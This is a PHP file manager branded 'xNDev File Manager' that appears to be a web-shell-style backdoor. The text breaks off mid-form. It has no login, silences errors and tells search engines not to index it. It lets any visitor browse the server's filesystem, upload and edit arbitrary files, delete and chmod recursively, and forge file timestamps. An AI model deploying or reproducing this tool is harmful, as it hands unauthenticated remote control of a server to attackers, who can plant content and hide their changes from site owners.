<?php
/**
 * xNDev File Manager
 * PHP 5.4+
 */

error_reporting(0);

$selfScript = basename($_SERVER['SCRIPT_NAME']);
$homeDir    = realpath(dirname(__FILE__));
$directory  = (isset($_GET['dir']) && $_GET['dir'] !== '') ? $_GET['dir'] : $homeDir;
$directory  = realpath($directory);

if ($directory === false) {
    $directory = $homeDir;
}

$isAtHome   = ($directory === $homeDir);
$urlBase    = $isAtHome ? '?' : '?dir=' . urlencode($directory) . '&amp;';
$actionUrl  = $isAtHome ? htmlspecialchars($selfScript) : '?dir=' . urlencode($directory);
$qDir       = urlencode($directory);

// Upload
$uploadMsg    = '';
$uploadedLink = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
    $name       = basename($_FILES['fileToUpload']['name']);
    $targetFile = $directory . '/' . $name;

    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
        $realTarget = realpath($targetFile);
        $docRoot    = !empty($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : '';
        $relPath    = $docRoot ? str_replace($docRoot, '', $realTarget) : '/' . $name;
        $relPath    = str_replace('\\', '/', $relPath);
        $scheme     = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host       = !empty($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
        $fileUrl    = $scheme . '://' . $host . $relPath;

        $uploadMsg    = 'success';
        $uploadedLink = $fileUrl;
    } else {
        $uploadMsg = 'error';
    }
}

// Edit File
$editMsg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fileContent'], $_POST['fileName'])) {
    $fileToEdit = $directory . '/' . basename($_POST['fileName']);
    if (file_put_contents($fileToEdit, $_POST['fileContent']) !== false) {
        $editMsg = 'Saved: ' . htmlspecialchars(basename($_POST['fileName']));
    } else {
        $editMsg = 'err:Failed to save file. Check write permissions.';
    }
}

// Rename
$renameMsg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['oldName'], $_POST['newName'])) {
    $oldPath = $directory . '/' . basename($_POST['oldName']);
    $newPath = $directory . '/' . basename($_POST['newName']);
    $newName = trim(basename($_POST['newName']));

    if ($newName === '') {
        $renameMsg = 'err:New name cannot be empty.';
    } elseif (file_exists($newPath)) {
        $renameMsg = 'err:Target name already exists.';
    } elseif (file_exists($oldPath) && rename($oldPath, $newPath)) {
        $renameMsg = htmlspecialchars(basename($_POST['oldName'])) . ' &rarr; ' . htmlspecialchars($newName);
    } else {
        $renameMsg = 'err:Rename failed.';
    }
}

// Delete helper
if (!function_exists('deleteRecursive')) {
    function deleteRecursive($target) {
        if (is_file($target) || is_link($target)) {
            return @unlink($target);
        }
        if (is_dir($target)) {
            $items = @scandir($target);
            if ($items !== false) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') {
                        continue;
                    }
                    if (!deleteRecursive($target . '/' . $item)) {
                        return false;
                    }
                }
            }
            return @rmdir($target);
        }
        return false;
    }
}

// Delete
$deleteMsg = '';
if (isset($_GET['delete'])) {
    $item = $directory . '/' . basename($_GET['delete']);
    if (file_exists($item)) {
        if (deleteRecursive($item)) {
            $deleteMsg = 'Deleted: ' . htmlspecialchars(basename($_GET['delete']));
        } else {
            $deleteMsg = 'err:Failed to delete ' . htmlspecialchars(basename($_GET['delete'])) . '. Check permissions.';
        }
    } else {
        $deleteMsg = 'err:Item not found.';
    }
}

// Create File
$createFileMsg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newFileName'])) {
    $newFileName = trim(basename($_POST['newFileName']));
    if ($newFileName !== '') {
        $targetNewFile = $directory . '/' . $newFileName;
        if (!file_exists($targetNewFile)) {
            $initialContent = isset($_POST['newFileContent']) ? $_POST['newFileContent'] : '';
            if (file_put_contents($targetNewFile, $initialContent) !== false) {
                $createFileMsg = 'Created file: ' . htmlspecialchars($newFileName);
            } else {
                $createFileMsg = 'err:Failed to create file. Check permissions.';
            }
        } else {
            $createFileMsg = 'err:File already exists.';
        }
    } else {
        $createFileMsg = 'err:File name cannot be empty.';
    }
}

// Create Folder
$createFolderMsg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newFolderName'])) {
    $newFolderName = trim(basename($_POST['newFolderName']));
    if ($newFolderName !== '') {
        $targetNewFolder = $directory . '/' . $newFolderName;
        if (!file_exists($targetNewFolder)) {
            if (@mkdir($targetNewFolder, 0755, true)) {
                $createFolderMsg = 'Created folder: ' . htmlspecialchars($newFolderName);
            } else {
                $createFolderMsg = 'err:Failed to create folder. Check permissions.';
            }
        } else {
            $createFolderMsg = 'err:Folder already exists.';
        }
    } else {
        $createFolderMsg = 'err:Folder name cannot be empty.';
    }
}

// Chmod helper
if (!function_exists('chmodRecursive')) {
    function chmodRecursive($target, $octal) {
        if (!@chmod($target, $octal)) {
            return false;
        }
        if (is_dir($target)) {
            $items = @scandir($target);
            if ($items !== false) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') {
                        continue;
                    }
                    if (!chmodRecursive($target . '/' . $item, $octal)) {
                        return false;
                    }
                }
            }
        }
        return true;
    }
}

// Chmod
$chmodMsg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newPerms'], $_POST['itemToChmod'])) {
    $item = $directory . '/' . basename($_POST['itemToChmod']);
    $permsInput = trim($_POST['newPerms']);

    if (preg_match('/^0?[0-7]{3}$/', $permsInput)) {
        $octal = octdec($permsInput);
        if (file_exists($item)) {
            $rec = (isset($_POST['recursiveChmod']) && $_POST['recursiveChmod'] === '1' && is_dir($item));
            $ok  = $rec ? chmodRecursive($item, $octal) : @chmod($item, $octal);
            if ($ok) {
                $chmodMsg = htmlspecialchars(basename($_POST['itemToChmod'])) . ' &rarr; ' . sprintf('%04o', $octal & 0777) . ($rec ? ' (recursive)' : '');
            } else {
                $chmodMsg = 'err:Failed to change permissions for ' . htmlspecialchars(basename($_POST['itemToChmod'])) . '.';
            }
        } else {
            $chmodMsg = 'err:Item not found.';
        }
    } else {
        $chmodMsg = 'err:Invalid permission format. Enter 3 or 4 octal digits (e.g. 0755 or 644).';
    }
}

// Touch (Date)
$touchMsg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['updateTime'], $_POST['itemToUpdate'])) {
    $item    = $directory . '/' . basename($_POST['itemToUpdate']);
    $newTime = strtotime($_POST['updateTime']);
    if ($newTime !== false) {
        if (@touch($item, $newTime)) {
            $touchMsg = htmlspecialchars(basename($_POST['itemToUpdate'])) . ' &rarr; ' . date('Y-m-d H:i:s', $newTime);
        } else {
            $touchMsg = 'err:Permission denied to update timestamp.';
        }
    } else {
        $touchMsg = 'err:Invalid date format. Use YYYY-MM-DD HH:MM:SS';
    }
}

// Breadcrumbs
if (!function_exists('buildBreadcrumbs')) {
    function buildBreadcrumbs($dir) {
        $cleanPath = str_replace('\\', '/', $dir);
        $cleanPath = rtrim($cleanPath, '/');
        if ($cleanPath === '') {
            return array(array('label' => '/', 'path' => '/'));
        }
        $parts  = explode('/', $cleanPath);
        $crumbs = array();
        $accum  = '';

        foreach ($parts as $p) {
            if ($p === '') {
                $accum = '/';
                $crumbs[] = array('label' => '/', 'path' => '/');
                continue;
            }
            $accum .= ($accum === '/' ? '' : '/') . $p;
            $crumbs[] = array('label' => $p, 'path' => $accum);
        }
        return $crumbs;
    }
}

$crumbs   = buildBreadcrumbs($directory);
$allItems = @scandir($directory);
$allItems = ($allItems !== false) ? $allItems : array();

$dirs  = array();
$flist = array();
foreach ($allItems as $item) {
    if ($item === '.' || $item === '..') { continue; }
    $fp = realpath($directory . '/' . $item);
    if ($fp === false) { continue; }
    if (is_dir($fp)) {
        $dirs[] = $item;
    } else {
        $flist[] = $item;
    }
}
sort($dirs);
sort($flist);

$parentDir   = dirname($directory);
$dirWritable = is_writable($directory);

if (!function_exists('fmtSize')) {
    function fmtSize($bytes) {
        if ($bytes < 1024) { return $bytes . ' B'; }
        if ($bytes < 1048576) { return round($bytes / 1024, 1) . ' KB'; }
        if ($bytes < 1073741824) { return round($bytes / 1048576, 1) . ' MB'; }
        return round($bytes / 1073741824, 2) . ' GB';
    }
}

if (!function_exists('fmtPerms')) {
    function fmtPerms($path) {
        $p = @fileperms($path);
        if ($p === false) { return '---'; }
        return substr(sprintf('%o', $p), -4);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="googlebot" content="noindex, nofollow">
    <title>xNDev File Manager</title>
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

        :root {
            --bg:          #0e1117;
            --surface:     #161b22;
            --surface-sub: #1f242d;
            --border:      #30363d;
            --text:        #c9d1d9;
            --text-muted:  #8b949e;
            --link:        #58a6ff;
            --link-hover:  #79c0ff;
            --dir-color:   #7ee787;
            --ok:          #3fb950;
            --err:         #f85149;
            --warn:        #d29922;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            padding: 18px 24px;
            font-size: 13px;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
        }

        a { color: var(--link); text-decoration: none; }
        a:hover { color: var(--link-hover); text-decoration: underline; }

        .topbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-bottom: 14px;
            border-bottom: 1px solid var(--border);
            margin-bottom: 14px;
            gap: 8px;
        }
        .brand {
            font-size: 16px;
            font-weight: 600;
            color: #f0f6fc;
            letter-spacing: 0.3px;
        }
        .sys-info {
            font-size: 11px;
            color: var(--text-muted);
            text-align: right;
            font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
            word-break: break-all;
        }

        .navbar {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
        }
        .btn-home {
            background: var(--surface);
            border: 1px solid var(--border);
            color: #f0f6fc;
            font-size: 12px;
            font-weight: 600;
            padding: 7px 14px;
            border-radius: 6px;
            white-space: nowrap;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            min-height: 34px;
            cursor: pointer;
            transition: background 0.15s, border-color 0.15s;
        }
        .btn-home:hover {
            background: var(--surface-sub);
            border-color: #8b949e;
            text-decoration: none;
        }
        .breadcrumb-bar {
            flex: 1;
            min-width: 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 6px 12px;
            font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
            font-size: 12px;
            min-height: 34px;
        }
        .crumb-links {
            overflow-x: auto;
            white-space: nowrap;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: thin;
            flex: 1;
            min-width: 0;
            padding-right: 8px;
        }
        .crumb-links a { color: var(--link); padding: 0 2px; }
        .crumb-links a:hover { text-decoration: underline; }
        .crumb-sep { color: var(--text-muted); margin: 0 2px; }
        .crumb-cur { color: #f0f6fc; font-weight: 600; }

        .perm-tag {
            font-size: 11px;
            font-weight: 600;
            flex-shrink: 0;
        }
        .perm-ok { color: var(--ok); }
        .perm-no { color: var(--err); }

        .alert {
            padding: 9px 12px;
            border-radius: 6px;
            margin-bottom: 12px;
            font-size: 12px;
            border: 1px solid;
            word-break: break-all;
        }
        .alert-ok {
            background: #0d1e13;
            border-color: #1b4724;
            color: var(--ok);
        }
        .alert-err {
            background: #251214;
            border-color: #5c1e23;
            color: var(--err);
        }
        .alert a {
            color: #79c0ff;
            text-decoration: underline;
        }

        .toolbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 8px 12px;
            margin-bottom: 12px;
            gap: 10px;
            flex-wrap: wrap;
        }
        .upload-form {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
            flex: 1;
            min-width: 220px;
        }
        .toolbar-actions {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .input-file {
            font-size: 12px;
            color: var(--text-muted);
            max-width: 100%;
        }
        .input-file::-webkit-file-upload-button {
            background: var(--surface-sub);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            margin-right: 8px;
        }
        .input-file::-webkit-file-upload-button:hover {
            border-color: #8b949e;
        }

        .btn {
            background: #238636;
            color: #ffffff;
            border: 1px solid rgba(240, 246, 252, 0.1);
            padding: 6px 14px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            min-height: 32px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: background 0.15s, border-color 0.15s;
        }
        .btn:hover { background: #2ea043; text-decoration: none; color: #fff; }

        .btn-sub {
            background: var(--surface-sub);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            min-height: 32px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: background 0.15s, border-color 0.15s;
        }
        .btn-sub:hover {
            border-color: #8b949e;
            color: #f0f6fc;
            text-decoration: none;
        }

        .table-wrap {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 6px;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            margin-bottom: 16px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
            min-width: 320px;
        }
        th {
            background: #11141a;
            color: var(--text-muted);
            text-align: left;
            padding: 9px 12px;
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            border-bottom: 1px solid var(--border);
            white-space: nowrap;
        }
        td {
            padding: 8px 12px;
            border-bottom: 1px solid #21262d;
            vertical-align: middle;
        }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: rgba(110, 118, 129, 0.05); }

        .item-name {
            font-weight: 500;
            word-break: break-word;
            min-width: 120px;
        }
        .dir-link { color: var(--dir-color); font-weight: 500; }
        .dir-link:hover { color: #9ae9a2; }
        .file-link { color: var(--text); }

        .col-size {
            color: var(--text-muted);
            font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
            white-space: nowrap;
            text-align: right;
            padding-right: 14px;
        }
        .col-perm {
            font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
            font-weight: 600;
            white-space: nowrap;
            text-align: center;
        }
        .col-date {
            font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
            white-space: nowrap;
        }
        .date-action {
            color: var(--text-muted);
            border-bottom: 1px dotted #484f58;
            cursor: pointer;
            transition: color 0.15s, border-color 0.15s;
        }
        .date-action:hover {
            color: var(--link-hover);
            border-color: var(--link-hover);
            text-decoration: none;
        }

        .perm-badge {
            display: inline-block;
            padding: 2px 7px;
            border-radius: 4px;
            font-size: 11px;
            font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
            background: var(--surface-sub);
            border: 1px solid var(--border);
            cursor: pointer;
            text-decoration: none;
            transition: all 0.15s;
        }
        .perm-badge:hover {
            border-color: var(--link);
            text-decoration: none;
            filter: brightness(1.2);
        }

        .actions {
            white-space: nowrap;
            text-align: right;
        }
        .act-btn {
            font-size: 11px;
            padding: 3px 8px;
            border-radius: 4px;
            margin-left: 4px;
            display: inline-block;
            text-decoration: none;
            transition: all 0.15s;
        }
        .act-edit { color: var(--link); }
        .act-ren  { color: var(--warn); }
        .act-del  { color: var(--err); }
        .act-btn:hover { text-decoration: underline; }

        .act-full { display: inline; }
        .act-short { display: none; }

        @media (max-width: 820px) {
            body { padding: 12px; }
            .act-full { display: none; }
            .act-short { display: inline; font-weight: 700; font-size: 12px; }
            .act-btn {
                min-width: 28px;
                height: 28px;
                padding: 0 6px;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                border-radius: 5px;
                margin-left: 3px;
                text-decoration: none;
            }
            .act-btn:hover { text-decoration: none; opacity: 0.9; }
            .act-edit {
                background: rgba(88, 166, 255, 0.12);
                border: 1px solid rgba(88, 166, 255, 0.35);
            }
            .act-ren {
                background: rgba(210, 153, 34, 0.12);
                border: 1px solid rgba(210, 153, 34, 0.35);
            }
            .act-del {
                background: rgba(248, 81, 73, 0.12);
                border: 1px solid rgba(248, 81, 73, 0.35);
            }
            .perm-badge {
                padding: 4px 8px;
                font-size: 11px;
            }
        }

        @media (max-width: 600px) {
            body { padding: 10px; font-size: 12px; }
            .topbar {
                flex-direction: column;
                align-items: flex-start;
                gap: 4px;
            }
            .sys-info {
                text-align: left;
                font-size: 10px;
            }
            .toolbar {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }
            .upload-form {
                width: 100%;
                display: flex;
                gap: 6px;
            }
            .input-file {
                flex: 1;
                min-width: 0;
            }
            .toolbar-actions {
                display: grid;
                grid-template-columns: 1fr 1fr;
                width: 100%;
                gap: 8px;
            }
            .toolbar-actions .btn-sub {
                width: 100%;
                min-height: 36px;
            }
            .col-date {
                display: none;
            }
            td, th {
                padding: 8px 8px;
            }
        }

        .panel {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 14px;
            margin-bottom: 14px;
        }
        .panel-head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .panel-title {
            font-size: 13px;
            font-weight: 600;
            color: #f0f6fc;
        }
        .panel-close {
            color: var(--text-muted);
            font-size: 12px;
        }
        .input-text {
            background: var(--bg);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 7px 11px;
            border-radius: 6px;
            font-size: 13px;
            font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
            outline: none;
            width: 100%;
        }
        .input-text:focus { border-color: var(--link); }
        textarea.input-text {
            resize: vertical;
            line-height: 1.5;
            tab-size: 4;
        }

        .modal-backdrop {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(3px);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 14px;
            overflow-y: auto;
        }
        .modal-box {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 8px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 16px 36px rgba(0, 0, 0, 0.6);
            animation: modalFadeIn 0.15s ease-out;
        }
        @keyframes modalFadeIn {
            from { opacity: 0; transform: scale(0.96); }
            to { opacity: 1; transform: scale(1); }
        }
        .modal-head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
        }
        .modal-title {
            font-size: 14px;
            font-weight: 600;
            color: #f0f6fc;
        }
        .modal-close {
            background: transparent;
            border: none;
            color: var(--text-muted);
            font-size: 20px;
            line-height: 1;
            cursor: pointer;
            padding: 2px 6px;
            border-radius: 4px;
        }
        .modal-close:hover {
            color: #f0f6fc;
            background: var(--surface-sub);
        }
        .modal-body {
            padding: 16px;
        }
        .modal-foot {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 10px;
            padding: 12px 16px;
            border-top: 1px solid var(--border);
            background: rgba(0, 0, 0, 0.15);
        }
        .form-group {
            margin-bottom: 14px;
        }
        .form-group:last-child {
            margin-bottom: 0;
        }
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #f0f6fc;
            margin-bottom: 6px;
        }
        .preset-group {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin-top: 6px;
        }
        .preset-btn {
            background: var(--surface-sub);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 4px 9px;
            border-radius: 5px;
            font-size: 11px;
            font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
            cursor: pointer;
            transition: all 0.15s;
        }
        .preset-btn:hover {
            border-color: var(--link);
            color: #f0f6fc;
        }
        .matrix-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
            margin-top: 6px;
        }
        .matrix-table th, .matrix-table td {
            padding: 6px 8px;
            text-align: center;
            border: 1px solid var(--border);
        }
        .matrix-table th {
            background: var(--surface-sub);
            font-size: 11px;
            color: var(--text-muted);
        }
        .matrix-table td:first-child {
            text-align: left;
            font-weight: 600;
            color: #f0f6fc;
        }
        .matrix-table input[type="checkbox"] {
            width: 17px;
            height: 17px;
            cursor: pointer;
            accent-color: #238636;
            vertical-align: middle;
        }
        .modal-target-info {
            font-size: 12px;
            color: var(--text-muted);
            margin-bottom: 12px;
            word-break: break-all;
        }
        .modal-target-info strong {
            color: #f0f6fc;
        }

        .footer {
            text-align: center;
            padding: 14px 0 6px;
            font-size: 11px;
            color: var(--text-muted);
            border-top: 1px solid var(--border);
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="topbar">
    <div class="brand">xNDev File Manager</div>
    <div class="sys-info"><?php echo php_uname('s') . ' &bull; PHP ' . phpversion(); ?></div>
</div>

<div class="navbar">
    <a class="btn-home" href="<?php echo htmlspecialchars($selfScript); ?>" title="Home: <?php echo htmlspecialchars($homeDir); ?>">[ HOME ]</a>
    <div class="breadcrumb-bar">
        <div class="crumb-links">
            <?php foreach ($crumbs as $i => $c):
                if ($i > 0) {
                    if (!($i === 1 && $crumbs[0]['label'] === '/')) {
                        echo '<span class="crumb-sep">/</span>';
                    }
                }
                if ($i === count($crumbs) - 1) {
                    echo '<span class="crumb-cur">' . htmlspecialchars($c['label']) . '</span>';
                } else {
                    $cUrl = ($c['path'] === $homeDir) ? htmlspecialchars($selfScript) : '?dir=' . urlencode($c['path']);
                    echo '<a href="' . $cUrl . '">' . htmlspecialchars($c['label']) . '</a>';
                }
            endforeach; ?>
        </div>
        <span class="perm-tag <?php echo $dirWritable ? 'perm-ok' : 'perm-no'; ?>">
            <?php echo $dirWritable ? 'Writable' : 'Read-only'; ?>
        </span>
    </div>
</div>

<?php if ($uploadMsg === 'success'): ?>
    <div class="alert alert-ok">
        Uploaded: <a href="<?php echo htmlspecialchars($uploadedLink); ?>" target="_blank"><?php echo htmlspecialchars($uploadedLink); ?></a>
    </div>
<?php elseif ($uploadMsg === 'error'): ?>
    <div class="alert alert-err">Upload failed. Check directory permissions.</div>
<?php endif; ?>

<?php if ($editMsg !== ''):
    $isErr = (strpos($editMsg, 'err:') === 0);
?>
    <div class="alert <?php echo $isErr ? 'alert-err' : 'alert-ok'; ?>">
        <?php echo $isErr ? htmlspecialchars(substr($editMsg, 4)) : htmlspecialchars($editMsg); ?>
    </div>
<?php endif; ?>

<?php if ($renameMsg !== ''):
    $isErr = (strpos($renameMsg, 'err:') === 0);
?>
    <div class="alert <?php echo $isErr ? 'alert-err' : 'alert-ok'; ?>">
        <?php echo $isErr ? htmlspecialchars(substr($renameMsg, 4)) : 'Renamed: ' . $renameMsg; ?>
    </div>
<?php endif; ?>

<?php if ($deleteMsg !== ''):
    $isErr = (strpos($deleteMsg, 'err:') === 0);
?>
    <div class="alert <?php echo $isErr ? 'alert-err' : 'alert-ok'; ?>">
        <?php echo $isErr ? htmlspecialchars(substr($deleteMsg, 4)) : $deleteMsg; ?>
    </div>
<?php endif; ?>

<?php if ($createFileMsg !== ''):
    $isErr = (strpos($createFileMsg, 'err:') === 0);
?>
    <div class="alert <?php echo $isErr ? 'alert-err' : 'alert-ok'; ?>">
        <?php echo $isErr ? htmlspecialchars(substr($createFileMsg, 4)) : $createFileMsg; ?>
    </div>
<?php endif; ?>

<?php if ($createFolderMsg !== ''):
    $isErr = (strpos($createFolderMsg, 'err:') === 0);
?>
    <div class="alert <?php echo $isErr ? 'alert-err' : 'alert-ok'; ?>">
        <?php echo $isErr ? htmlspecialchars(substr($createFolderMsg, 4)) : $createFolderMsg; ?>
    </div>
<?php endif; ?>

<?php if ($chmodMsg !== ''):
    $isErr = (strpos($chmodMsg, 'err:') === 0);
?>
    <div class="alert <?php echo $isErr ? 'alert-err' : 'alert-ok'; ?>">
        <?php echo $isErr ? htmlspecialchars(substr($chmodMsg, 4)) : 'Permissions changed: ' . $chmodMsg; ?>
    </div>
<?php endif; ?>

<?php if ($touchMsg !== ''):
    $isErr = (strpos($touchMsg, 'err:') === 0);
?>
    <div class="alert <?php echo $isErr ? 'alert-err' : 'alert-ok'; ?>">
        <?php echo $isErr ? htmlspecialchars(substr($touchMsg, 4)) : 'Updated date: ' . $touchMsg; ?>
    </div>
<?php endif; ?>

<div class="toolbar">
    <form class="upload-form" action="<?php echo $actionUrl; ?>" method="post" enctype="multipart/form-data">
        <input type="file" name="fileToUpload" class="input-file">
        <button type="submit" class="btn">Upload</button>
    </form>
    <div class="toolbar-actions">
        <button type="button" class="btn-sub" onclick="openCreateFileModal();">&#43; New File</button>
        <button type="button" class="btn-sub" onclick="openCreateFolderModal();">&#43; New Folder</button>
    </div>
</div>

<div class="table-wrap">
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th style="text-align:right;">Size</th>
                <th style="text-align:center;">Perms</th>
                <th class="col-date">Modified</th>
                <th style="text-align:right;">Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php if ($parentDir && $parentDir !== $directory): ?>
            <tr>
                <td class="item-name">
                    <a href="<?php echo ($parentDir === $homeDir) ? htmlspecialchars($selfScript) : '?dir=' . urlencode($parentDir); ?>" class="dir-link">&#8593; ..</a>
                </td>
                <td class="col-size">&mdash;</td>
                <td class="col-perm">&mdash;</td>
                <td class="col-date">&mdash;</td>
                <td class="actions">&mdash;</td>
            </tr>
        <?php endif; ?>

        <?php
        foreach ($dirs as $d):
            $fp       = realpath($directory . '/' . $d);
            $writable = is_writable($fp);
            $modTime  = date('Y-m-d H:i:s', filemtime($fp));
            $perms    = fmtPerms($fp);
            $qFile    = urlencode($d);
            $jsD      = htmlspecialchars(addslashes($d), ENT_QUOTES, 'UTF-8');
        ?>
            <tr>
                <td class="item-name">
                    <a href="?dir=<?php echo urlencode($fp); ?>" class="dir-link">&#128193; <?php echo htmlspecialchars($d); ?></a>
                </td>
                <td class="col-size">&mdash;</td>
                <td class="col-perm">
                    <a href="<?php echo $urlBase; ?>chmod=<?php echo $qFile; ?>"
                       class="perm-badge <?php echo $writable ? 'perm-ok' : 'perm-no'; ?>"
                       title="Click to change permissions (chmod)"
                       onclick="event.preventDefault(); openChmodModal('<?php echo $jsD; ?>', '<?php echo $perms; ?>', true);"><?php echo $perms; ?></a>
                </td>
                <td class="col-date">
                    <a href="<?php echo $urlBase; ?>touch=<?php echo $qFile; ?>"
                       class="date-action"
                       onclick="event.preventDefault(); openTouchModal('<?php echo $jsD; ?>', '<?php echo $modTime; ?>');"
                       title="Click to change date"><?php echo $modTime; ?></a>
                </td>
                <td class="actions">
                    <a href="<?php echo $urlBase; ?>rename=<?php echo $qFile; ?>"
                       class="act-btn act-ren"
                       title="Rename"
                       onclick="event.preventDefault(); openRenameModal('<?php echo $jsD; ?>');"><span class="act-full">Rename</span><span class="act-short">R</span></a>
                    <a href="<?php echo $urlBase; ?>delete=<?php echo $qFile; ?>"
                       class="act-btn act-del"
                       title="Delete"
                       onclick="return confirm('Delete directory and all contents recursively: <?php echo $jsD; ?>?');"><span class="act-full">Delete</span><span class="act-short">D</span></a>
                </td>
            </tr>
        <?php
        endforeach;

        foreach ($flist as $f):
            $fp       = realpath($directory . '/' . $f);
            $writable = is_writable($fp);
            $modTime  = date('Y-m-d H:i:s', filemtime($fp));
            $perms    = fmtPerms($fp);
            $size     = fmtSize(filesize($fp));
            $qFile    = urlencode($f);
            $jsF      = htmlspecialchars(addslashes($f), ENT_QUOTES, 'UTF-8');
        ?>
            <tr>
                <td class="item-name">
                    <span class="file-link">&#128196; <?php echo htmlspecialchars($f); ?></span>
                </td>
                <td class="col-size"><?php echo $size; ?></td>
                <td class="col-perm">
                    <a href="<?php echo $urlBase; ?>chmod=<?php echo $qFile; ?>"
                       class="perm-badge <?php echo $writable ? 'perm-ok' : 'perm-no'; ?>"
                       title="Click to change permissions (chmod)"
                       onclick="event.preventDefault(); openChmodModal('<?php echo $jsF; ?>', '<?php echo $perms; ?>', false);"><?php echo $perms; ?></a>
                </td>
                <td class="col-date">
                    <a href="<?php echo $urlBase; ?>touch=<?php echo $qFile; ?>"
                       class="date-action"
                       onclick="event.preventDefault(); openTouchModal('<?php echo $jsF; ?>', '<?php echo $modTime; ?>');"
                       title="Click to change date"><?php echo $modTime; ?></a>
                </td>
                <td class="actions">
                    <a href="<?php echo $urlBase; ?>edit=<?php echo $qFile; ?>"
                       class="act-btn act-edit"
                       title="Edit"><span class="act-full">Edit</span><span class="act-short">E</span></a>
                    <a href="<?php echo $urlBase; ?>rename=<?php echo $qFile; ?>"
                       class="act-btn act-ren"
                       title="Rename"
                       onclick="event.preventDefault(); openRenameModal('<?php echo $jsF; ?>');"><span class="act-full">Rename</span><span class="act-short">R</span></a>
                    <a href="<?php echo $urlBase; ?>delete=<?php echo $qFile; ?>"
                       class="act-btn act-del"
                       title="Delete"
                       onclick="return confirm('Delete file: <?php echo $jsF; ?>?');"><span class="act-full">Delete</span><span class="act-short">D</span></a>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
</div>

<?php if (isset($_GET['newfile'])): ?>
<div class="panel">
    <div class="panel-head">
        <span class="panel-title">Create New File</span>
        <a href="<?php echo $actionUrl; ?>" class="panel-close">[ Close ]</a>
    </div>
    <form action="<?php echo $actionUrl; ?>" method="post">
        <div class="form-group">
            <input type="text" name="newFileName" placeholder="file-name.txt" class="input-text" style="margin-bottom:8px;" required autofocus>
